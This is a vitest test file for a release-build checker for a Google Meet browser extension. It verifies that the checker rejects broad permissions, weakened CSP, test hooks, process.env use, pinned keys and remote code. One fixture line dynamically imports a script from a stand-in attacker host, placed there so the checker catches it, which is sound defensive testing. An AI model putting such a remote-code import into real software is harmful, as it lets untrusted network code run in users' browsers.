import { describe, expect, it } from 'vitest';
// @ts-expect-error plain .mjs, no types
import { checkBuild } from './check-build-lib.mjs';

const API = 'https://api.example.run.app';
const good = {
  manifest_version: 3,
  permissions: ['storage'],
  host_permissions: [`${API}/*`],
  content_scripts: [
    {
      matches: ['https://meet.google.com/*'],
      run_at: 'document_idle',
      js: ['content-scripts/content.js'],
    },
    {
      matches: ['https://meet.google.com/*'],
      run_at: 'document_start',
      world: 'MAIN',
      js: ['content-scripts/inject.js'],
    },
  ],
  content_security_policy: {
    extension_pages: `script-src 'self' 'wasm-unsafe-eval'; object-src 'self'; connect-src 'self' ${API}; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline'`,
  },
  web_accessible_resources: [
    { resources: ['tracker.html'], matches: ['https://meet.google.com/*'] },
    { resources: ['content-scripts/content.css'], matches: ['https://meet.google.com/*'] },
  ],
};
const env = { apiOrigin: API, fakeMeet: false, e2e: false, devKey: false };
const run = (
  manifest: unknown = good,
  bundles: Record<string, string> = { 'a.js': 'console.log(1)' },
  e = env,
) => checkBuild({ manifest, bundles, env: e }) as string[];

describe('release build check', () => {
  it('accepts a well-formed release build', () => expect(run()).toEqual([]));

  it('rejects extra permissions and broad host access', () => {
    expect(run({ ...good, permissions: ['storage', 'tabs'] }).join()).toMatch(/permissions/);
    expect(run({ ...good, host_permissions: [`${API}/*`, '<all_urls>'] }).join()).toMatch(
      /host_permissions/,
    );
  });

  it('rejects a weakened CSP or remote script sources', () => {
    const weak = (csp: string) => ({ ...good, content_security_policy: { extension_pages: csp } });
    expect(
      run(
        weak(`script-src 'self' 'unsafe-eval'; object-src 'self'; connect-src 'self' ${API}`),
      ).join(),
    ).toMatch(/unsafe-eval|script-src/);
    expect(
      run(
        weak(
          `script-src 'self' https://cdn.example.com 'wasm-unsafe-eval'; object-src 'self'; connect-src 'self' ${API}`,
        ),
      ).join(),
    ).toMatch(/script-src/);
    expect(
      run(weak(`script-src 'self' 'wasm-unsafe-eval'; object-src 'self'; connect-src *`)).join(),
    ).toMatch(/connect-src/);
  });

  it('rejects the fake Meet host and e2e hook in a release build, but allows them in a dev build', () => {
    const dev = {
      ...good,
      content_scripts: good.content_scripts.map((c) => ({
        ...c,
        matches: ['https://meet.google.com/*', 'http://localhost:4173/*'],
      })),
      web_accessible_resources: good.web_accessible_resources.map((r) => ({
        ...r,
        matches: ['https://meet.google.com/*', 'http://localhost:4173/*'],
      })),
    };
    expect(run(dev).join()).toMatch(/matches/);
    expect(run(dev, {}, { ...env, fakeMeet: true })).toEqual([]);
    expect(run(good, { 'c.js': "addEventListener('audion:e2e-frame',f)" }).join()).toMatch(
      /test hook/,
    );
    expect(
      run(good, { 'c.js': "addEventListener('audion:e2e-frame',f)" }, { ...env, e2e: true }),
    ).toEqual([]);
  });

  it('rejects a raw process.env (it throws in the browser) and remote code loading', () => {
    expect(run(good, { 'content.js': 'const x=process.env.FOO==="1"' }).join()).toMatch(
      /process\.env/,
    );
    expect(run(good, { 'a.js': 'import("https://evil.example/x.js")' }).join()).toMatch(
      /remote code/,
    );
  });

  it('rejects a pinned manifest key unless a dev key was requested', () => {
    expect(run({ ...good, key: 'MIIB' }).join()).toMatch(/manifest\.key/);
    expect(run({ ...good, key: 'MIIB' }, {}, { ...env, devKey: true })).toEqual([]);
  });

  it('rejects unexpected web-accessible resources', () => {
    expect(
      run({
        ...good,
        web_accessible_resources: [
          {
            resources: [
              'models/hand_landmarker.task',
              'tracker.html',
              'content-scripts/content.css',
            ],
            matches: ['https://meet.google.com/*'],
          },
        ],
      }).join(),
    ).toMatch(/web_accessible_resources/);
  });
});
